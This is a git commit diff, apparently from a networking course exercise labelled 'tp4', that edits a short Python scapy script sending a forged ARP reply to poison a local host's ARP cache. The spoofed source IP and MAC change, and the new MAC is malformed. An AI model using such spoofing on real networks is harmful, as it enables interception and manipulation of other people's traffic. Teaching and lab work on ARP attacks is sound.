84b46b47660d830e4ee74a1b7b3a7fb2a9138d5d
badusch <vincent.badusch@gmail.com>
2024-10-18 12:35:41 +0200

    tp4

--- arp_poisoning.py
+++ arp_poisoning.py
@@ -2,5 +2,5 @@ from scapy.all import *
 
 
 def spoofing():
-    packet = scapy.ARP(op=2, hwdst="30:89:4A:D2:5A:AA", pdst="10.33.73.72", psrc="10.33.73.77", hwsrc="98:8D:46:C4:FA:E5")
+    packet = scapy.ARP(op=2, hwdst="30:89:4A:D2:5A:AA", pdst="10.33.73.72", psrc="10.13.33.37", hwsrc="ad:be:ef:ca:fe")
     scapy.send(packet, verbose=False)
